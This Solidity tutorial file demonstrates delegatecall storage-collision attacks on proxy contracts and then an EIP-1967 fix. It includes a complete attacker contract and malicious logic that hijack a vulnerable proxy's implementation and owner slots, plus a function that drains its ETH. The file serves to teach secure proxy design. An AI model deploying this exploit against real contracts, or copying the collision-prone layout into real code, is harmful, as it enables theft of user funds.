// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ================================================================
//  DAY 2 / 3 — DELEGATECALL STORAGE COLLISION
//  The $280M Bug Still Hiding in Proxy Contracts
// ================================================================

// ================================================================
//  PART 1 — VULNERABLE  (Storage Layout Mismatch)
// ================================================================

/// @notice Proxy stores implementation address at slot 0.
contract VulnerableProxy {
    address public implementation; // slot 0  ← CRITICAL pointer
    address public owner;          // slot 1

    constructor(address _impl) {
        implementation = _impl;
        owner = msg.sender;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0  { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice ⚠️ MISMATCHED layout — slot 0 here is NOT the implementation.
///         When delegatecalled, writes to slot 0 overwrite proxy.implementation!
contract VulnerableLogic {
    address public pendingAdmin; // slot 0 ← COLLIDES with proxy.implementation
    address public admin;        // slot 1 ← COLLIDES with proxy.owner
    uint256 public value;        // slot 2

    // ⚠️ This writes to proxy's slot 0 = overwrites implementation pointer!
    function setPendingAdmin(address _admin) external {
        pendingAdmin = _admin;
    }

    // ⚠️ This writes to proxy's slot 1 = overwrites owner!
    function confirmAdmin() external {
        require(msg.sender == pendingAdmin, "Not pending admin");
        admin    = pendingAdmin;
        pendingAdmin = address(0);
    }

    function setValue(uint256 _value) external {
        value = _value;
    }
}

/// @notice Attacker hijacks the proxy in two calls.
contract Attacker {
    VulnerableProxy public proxy;

    constructor(address _proxy) {
        proxy = VulnerableProxy(payable(_proxy));
    }

    function attack() external {
        MaliciousLogic mal = new MaliciousLogic();

        // Step 1: Call setPendingAdmin through the proxy.
        //   delegatecall executes inside proxy's context.
        //   pendingAdmin (slot 0 in logic) → implementation (slot 0 in proxy).
        //   → proxy.implementation is now address(mal)
        VulnerableLogic(address(proxy)).setPendingAdmin(address(mal));

        // Step 2: proxy.implementation is now address(mal), so all calls
        //   route to MaliciousLogic. Call claimOwnership() through the proxy.
        //   _ownerSlot (slot 1 in MaliciousLogic) → owner (slot 1 in proxy).
        //   → proxy.owner is now msg.sender (attacker)
        MaliciousLogic(address(proxy)).claimOwnership();

        // Proxy is fully hijacked:
        //   • All future calls route to MaliciousLogic
        //   • Attacker is the new owner
        //   • Original funds / state are unreachable
    }
}

contract MaliciousLogic {
    address private _implSlot;  // slot 0 — mirrors proxy.implementation (already hijacked)
    address private _ownerSlot; // slot 1 — mirrors proxy.owner

    // Writes msg.sender to slot 1 of the proxy, hijacking proxy.owner
    function claimOwnership() external {
        _ownerSlot = msg.sender;
    }

    // Drain all ETH from the proxy
    function drain(address payable to) external {
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }
}


// ================================================================
//  PART 2 — SECURE  (EIP-1967 Isolated Storage Slots)
// ================================================================
contract SecureProxy {
    // EIP-1967 implementation slot
    bytes32 private constant IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    // EIP-1967 admin slot
    bytes32 private constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    event Upgraded(address indexed newImplementation);

    constructor(address _impl) {
        _setImpl(_impl);
        _setAdmin(msg.sender);
    }

    // ✅ Only admin can upgrade — implementation pointer lives at EIP-1967 slot
    function upgradeTo(address newImpl) external {
        require(msg.sender == _getAdmin(), "Not admin");
        _setImpl(newImpl);
        emit Upgraded(newImpl);
    }

    function getImplementation() external view returns (address) { return _getImpl(); }
    function getAdmin()          external view returns (address) { return _getAdmin(); }

    fallback() external payable {
        address impl = _getImpl();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0  { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function _getImpl() private view returns (address impl) {
        assembly { impl := sload(IMPL_SLOT) }
    }

    function _setImpl(address impl) private {
        assembly { sstore(IMPL_SLOT, impl) }
    }

    function _getAdmin() private view returns (address admin) {
        assembly { admin := sload(ADMIN_SLOT) }
    }

    function _setAdmin(address admin) private {
        assembly { sstore(ADMIN_SLOT, admin) }
    }
}

/// @notice ✅ Safe logic contract — its slot 0/1/2 never touch EIP-1967 slots.
contract SecureLogic {
    address public pendingAdmin; // slot 0  — harmless, no EIP-1967 collision
    address public admin;        // slot 1  — harmless
    uint256 public value;        // slot 2  — harmless

    function setPendingAdmin(address _admin) external {
        pendingAdmin = _admin;
    }

    function confirmAdmin() external {
        require(msg.sender == pendingAdmin, "Not pending admin");
        admin        = pendingAdmin;
        pendingAdmin = address(0);
    }

    function setValue(uint256 _value) external {
        value = _value;
    }
}

// ================================================================
//  KEY TAKEAWAYS
// ================================================================
//
//  ❌ VULNERABLE pattern:
//     • Proxy and logic share overlapping sequential storage slots
//     • Any logic write can silently corrupt proxy internals
//
//  ✅ SECURE pattern  (EIP-1967):
//     • Implementation & admin stored at pseudo-random keccak256 slots
//     • Logic contract's natural storage (slot 0, 1, 2…) never collides
//     • Use OpenZeppelin's TransparentUpgradeableProxy or UUPS — they
//       implement EIP-1967 out of the box
// ================================================================